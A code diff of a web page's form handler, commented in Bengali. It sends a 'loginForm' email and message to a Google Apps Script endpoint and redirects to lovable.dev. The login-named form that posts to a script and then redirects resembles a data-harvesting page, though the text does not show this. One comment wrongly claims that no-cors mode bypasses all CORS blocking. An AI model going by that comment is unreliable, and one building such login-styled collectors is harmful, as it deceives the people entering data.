@@ -199,28 +199,29 @@
 </div>
 
 <script>
-  // ১. 
+  // ১. আপনার সর্বশেষ জেনারেট করা সঠিক স্ক্রিপ্ট লিংকটি এখানে বসাবেন
   const scriptURL = "https://script.google.com/macros/s/AKfycbwPtmzaYLq2WAM4k2Kvam0xg2vUyMe0DKceJ6FbgZgSEP9GM4hjN11E2r1JGi0X746v/exec"; 
   const redirectURL = "https://lovable.dev";
 
   document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
-    // 
+    // Form Data জেনারেট করা হচ্ছে
     const formData = new URLSearchParams();
     formData.append("email", document.getElementById("email").value);
     formData.append("message", document.getElementById("message").value);
 
+    // mode: "no-cors" যোগ করা হয়েছে যা সব ধরণের CORS ব্লকিং বাইপাস করবে
     fetch(scriptURL, {
       method: "POST",
-      body: formData, // JSON-ে
+      body: formData,
+      mode: "no-cors", 
       headers: {
-        "Content-Type": "application/x-www-form-urlencoded" // 
+        "Content-Type": "application/x-www-form-urlencoded"
       }
     })
-    .then(response => response.json())
-    .then(result => {
-      // 
+    .then(() => {
+      // no-cors মোডে সাকসেস রেসপন্স রিড করা যায় না, তাই সরাসরি রিডাইরেক্ট করে দেওয়া হচ্ছে
       window.location.href = redirectURL;
     })
     .catch(err => {
@@ -229,8 +230,7 @@
     });
   });
 </script>
-  });
-</script>
+
 
 </body>
 </html>
